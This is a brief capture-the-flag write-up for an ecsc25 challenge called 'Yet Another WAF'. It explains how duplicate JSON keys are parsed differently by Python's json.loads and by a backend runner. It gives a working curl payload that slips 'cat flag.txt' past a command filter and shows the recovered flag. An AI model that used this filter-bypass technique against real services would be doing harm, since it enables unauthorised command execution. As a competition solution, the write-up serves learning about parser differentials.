# Yet Another WAF

I figured that the binary may parse json in a different way, so I attempted providing dict with two the same keys and that was a good guess. We can send two commands with the same key, `json.loads` will keep the second value which bypasses the `id` cmd check, the runner will keep the first value:
```bash
curl -X POST -H 'Content-Type: application/json' https://yaw.ecsc25.hack.cert.pl/run -d '{"cmd": "cat flag.txt", "cmd": "id"}'
# ecsc25{names_within_an_object_SHOULD_be_unique}
```